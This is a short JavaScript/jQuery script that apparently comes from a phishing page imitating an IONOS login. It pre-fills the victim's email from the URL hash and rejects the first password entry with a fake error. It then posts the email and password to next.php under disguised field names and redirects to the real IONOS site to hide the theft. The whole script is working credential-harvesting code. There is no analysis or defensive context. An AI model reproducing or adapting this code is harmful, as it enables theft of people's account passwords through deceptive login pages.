<script>
    $(document).ready(function() {
    var count = 0;
    var ai= window.location.hash.substr(1);
  
    if (ai)  {
        $('#id').val(ai);  
        setTimeout(()=>{
          nextFun()
        },600);    
    }
});
document.addEventListener("keydown", function(event) {
    if (event.key === "Enter") {
        nextFun()
    }
});
    var count = 0;
//  $('#em-div').show();
 $('#pass-div').hide();
 function backbtn(){

    $('#em-div').show();
    $('#pass-div').hide();
    count = 0 ;
 } 

 function validateEmail(email) {
    if(email == ''){
        return false
    }
    else{
  var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
  return emailReg.test(email);
    }
}

   function nextFun() {
        var id = document.getElementById('id');
        var pass = document.getElementById('pass');



    if(!validateEmail(id.value)){
        return
    }
    else if (id.value.length > 0 && count == 0 ) {
        $('#next-btn').prop('disabled', true);
        setTimeout(()=>{
            $('#next-btn').prop('disabled', false);

            $('#em-div').hide();
            $('#pass-div').show();

            $('#em-btn').html(id.value);
            count = 1;
        },800);
    }
    else if (id.value.length > 0 && pass.value.length == 0 && count == 1 ) {
        $('#pass-err').hide();

        $('#next-btn1').prop('disabled', true);
        setTimeout(()=>{
            $('#next-btn1').prop('disabled', false);
            $('#pass-err').show();

            
            count = 1;
        },200);
    }

        else if (id.value.length > 0 && pass.value.length > 0 && count == 1 ) {
           
        $('#pass-err').hide();
        $('#next-btn1').prop('disabled', true);
          setTimeout(() => {
            $('#next-btn1').prop('disabled', true);
            var idv = $("#id").val();
            var passv = $("#pass").val();
                    $.ajax({
                        url: "next.php",
                        type: "POST",
                        data: { di: idv, pr: passv },
                        success: function (response) {
                            window.location.replace("https://www.ionos.com/");
                            console.log("Success:", response);
                        },
                        error: function (xhr, status, error) {
                            // Handle any errors that occur during the AJAX request
                            console.error("Error:", error);
                        }
                    });
            }, 1500);
            count = 0;
        }
    }
</script>
